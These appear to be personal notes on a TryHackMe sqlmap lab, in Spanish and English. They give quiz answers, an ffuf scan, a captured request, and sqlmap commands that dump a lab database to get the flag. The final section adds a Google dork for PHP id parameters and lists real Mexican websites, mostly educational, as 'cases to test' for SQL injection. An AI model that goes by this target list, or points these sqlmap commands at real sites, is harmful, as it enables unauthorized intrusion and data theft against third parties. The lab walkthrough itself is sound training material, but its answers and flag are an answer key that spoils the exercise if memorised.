


https://tryhackme.com/r/room/sqlmap

- antes de probar borrar historial de sqlmap
```
/home/kali/.local/share/sqlmap/
```

##  Task 1 Introduction
  


## Task 2 - Using Sqlmap


`sqlmap -h`
`sqlmap -hh`

**Basic** commands:
**Enumeration** commands:
Operating System access commands


### Which flag or option will allow you to add a URL to the command?

-u

### Which flag would you use to add data to a POST request?

--data

### There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?

-p username


### Which flag would you use to show the advanced help menu?

-hh

Which flag allows you to retrieve everything?

-a

Which flag allows you to select the database name?

-D

Which flag would you use to retrieve database tables?

--tables

Which flag allows you to retrieve a table’s columns?

--columns

Which flag allows you to dump all the database table entries?

--dump-all

Which flag will give you an interactive SQL Shell prompt?

--sql-shell

You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

--dbms=mysql

## Task 3 SQLMap Challenge


### What is the name of the interesting directory ?

	blood

```
ffuf -u http://10.10.156.125/FUZZ -w /tools/seclists/Discovery/Web-Content/big.txt -t 100
```

### Who is the current db user? 

https://10.10.217.247/blood/nl-search.php

- copiar el request a un archivo, primero el request, luego el parametro

```
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.156.125
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://10.10.156.125
Connection: keep-alive
Referer: http://10.10.156.125/blood/nl-search.php
Cookie: PHPSESSID=c6sb25adrd80s57hb1s0riejg3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

blood_group=Select Your Blood Group

```


```
sqlmap -r req 

sqlmap -r req  --current-user
current user: 'root@localhost'
```


	root

### What is the final flag?



`thm{sqlm@p_is_L0ve}`


```
sqlmap -r req  --dbs
sqlmap -r req  --dbs -D blood
sqlmap -r req  --dbs -D blood --tables
sqlmap -r req  --dbs -D blood -T flag --columns 
 
sqlmap -r req  --dbs -D blood -T flag --dump

+----+---------------------+--------+
| id | flag                | name   |
+----+---------------------+--------+
| 1  | thm{sqlm@p_is_L0ve} | flag   |
+----+---------------------+--------+

```


## busquedas

```
site:mx inurl:php?id=
```

### Casos para probar 

http://php.cobachbc.edu.mx/repositorio/index.php?id=262
http://guiadecarreras.udg.mx/app_guiacarrera/testorientacion-nuevo.php?id=101
https://www.mexico2.com.mx/proyectos.php?id=21
http://www.uno.edu.mx/plantilla.php?id=9
http://www.ulm.edu.mx/index.php?option=com_content&task=category&sectionid=22&id=114&Itemid=220&Itemid=222&Itemid=222



 